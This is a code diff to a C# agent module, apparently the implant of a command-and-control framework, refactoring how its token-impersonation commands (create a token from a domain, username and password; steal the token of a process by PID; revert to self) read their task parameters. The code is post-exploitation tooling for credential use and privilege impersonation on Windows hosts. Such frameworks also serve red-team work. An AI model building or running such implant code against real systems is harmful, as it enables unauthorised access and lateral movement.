@@ -8,7 +8,6 @@ using Shared.Models;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.Linq;
 
 namespace Agent.Modules
 {
@@ -49,26 +48,21 @@ namespace Agent.Modules
             };
         }
 
-        void CreateToken(string AgentID, C2Data C2Data)
+        void CreateToken(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-                
-                var userDomain = (string)parameters.FirstOrDefault(p => p.Name.Equals("UserDomain", StringComparison.OrdinalIgnoreCase)).Value;
-                var password = (string)parameters.FirstOrDefault(p => p.Name.Equals("Password", StringComparison.OrdinalIgnoreCase)).Value;
-
-                var split = userDomain.Split('\\');
-                var domain = split[0];
-                var username = split[1];
+                var domain = (string)Task.Parameters["Domain"];
+                var username = (string)Task.Parameters["Username"];
+                var password = (string)Task.Parameters["Password"];
 
                 if (Token.CreateToken(username, domain, password))
                 {
-                    Agent.SendMessage($"Successfully created and impersonated token for {userDomain}");
+                    Agent.SendMessage($"Successfully created and impersonated token for {domain}\\{username}");
                 }
                 else
                 {
-                    Agent.SendError($"Unable to create and impersonate token for {userDomain}");
+                    Agent.SendError($"Unable to create and impersonate token for {domain}\\{username}");
                 }
             }
             catch (Exception e)
@@ -77,7 +71,7 @@ namespace Agent.Modules
             }
         }
 
-        void RevertToSelf(string AgentID, C2Data C2Data)
+        void RevertToSelf(string AgentID, AgentTask Task)
         {
             if (Token.Rev2Self())
             {
@@ -89,13 +83,11 @@ namespace Agent.Modules
             }
         }
 
-        void StealToken(string AgentID, C2Data C2Data)
+        void StealToken(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-                var pid = (int)parameters.FirstOrDefault(p => p.Name.Equals("PID", StringComparison.OrdinalIgnoreCase)).Value;
-
+                var pid = (int)Task.Parameters["PID"];
                 var process = Process.GetProcessById(pid);
                 var owner = Helpers.GetProcessOwner(process);
 
